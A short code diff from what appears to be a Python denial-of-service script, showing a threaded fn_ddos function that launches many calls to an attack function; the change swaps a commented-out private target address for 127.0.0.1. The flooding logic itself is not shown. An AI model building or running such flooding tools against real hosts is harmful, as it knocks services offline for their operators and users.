@@ -9,7 +9,7 @@ def attack(target, port=80):
     s.close()
 
 def fn_ddos(target, threads, port=80):
-    # target = '172.16.80.11' #'172.16.80.38' 
+    # target = '127.0.0.1' #réseaux local
     threads_list = []
     for i in range(threads):
         t = threading.Thread(target=attack, args=(target, port))
